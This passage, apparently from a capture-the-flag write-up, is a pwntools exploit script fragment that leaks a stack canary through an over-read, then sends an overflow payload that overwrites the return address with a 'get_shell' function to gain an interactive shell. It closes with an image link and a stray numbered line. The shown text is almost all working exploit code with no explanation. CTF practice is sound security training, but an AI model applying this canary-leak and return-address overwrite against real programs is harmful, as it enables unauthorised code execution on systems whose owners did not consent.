    p.sendlineafter(b'> ',b'2')
    size = i
    p.sendlineafter(b': ', str(size))

    p.sendlineafter(b': ',b'A'*size)
    p.recv(0x6+size) #6 for 'Data:' string
    canary = b'\x00'
    canary += p.recv(7)

    print(hex(u64(canary)))

    pay = b''
    pay += b'A'*(0x30-0x8)
    pay += canary
    pay += b'A'*8
    pay += p64(e.symbols['get_shell'])

    p.sendlineafter(b'> ',b'3')
    p.sendlineafter(b'comment: ',pay)

    p.sendline(b'id')

    check = p.can_recv(timeout=1)
    print(hex(i))
    if check == True:
        p.interactive()
    p.close()
```

![image](https://hackmd.io/_uploads/r1dHXt0Ikl.png)


39 .